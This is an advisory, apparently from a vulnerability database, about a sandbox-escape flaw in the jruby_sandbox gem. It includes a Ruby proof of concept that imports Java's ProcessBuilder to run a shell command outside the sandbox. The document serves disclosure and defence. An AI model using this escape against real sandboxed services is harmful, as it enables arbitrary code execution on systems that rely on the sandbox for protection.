## Overview
[`jruby_sandbox`](https://rubygems.org/gems/jruby_sandbox) is a version of `_why's Freaky Freaky Sandbox` for JRuby.
Affected versions of this gem are vulnerable to sandbox bypassing for arbitrary code execution while importing Java classes.

## Details
`jruby_sandbox` aims to allow safe execution of user given Ruby code within a JRuby [0] runtime. However via import of Java classes it is possible to circumvent those protections and execute arbitrary code outside the sandboxed environment.

**Example:**
```ruby
require 'sandbox'
sand = Sandbox.safe
sand.activate!

begin
  sand.eval("print `id`")
rescue Exception => e
  puts "fail via Ruby ;)"
end
puts "Now for some Java"

sand.eval("Kernel.send :java_import, 'java.lang.ProcessBuilder'")
sand.eval("Kernel.send :java_import, 'java.util.Scanner'")
sand.eval("s = Java::java.util.Scanner.new( " +
          "Java::java.lang.ProcessBuilder.new('sh','-c','id')" +
          ".start.getInputStream  ).useDelimiter(\"\x00\").next")
sand.eval("print s")
```

## References
- http://rubysec.com/advisories/OSVDB-106279
- http://www.phenoelit.org/stuff/jruby-sandbox.txt
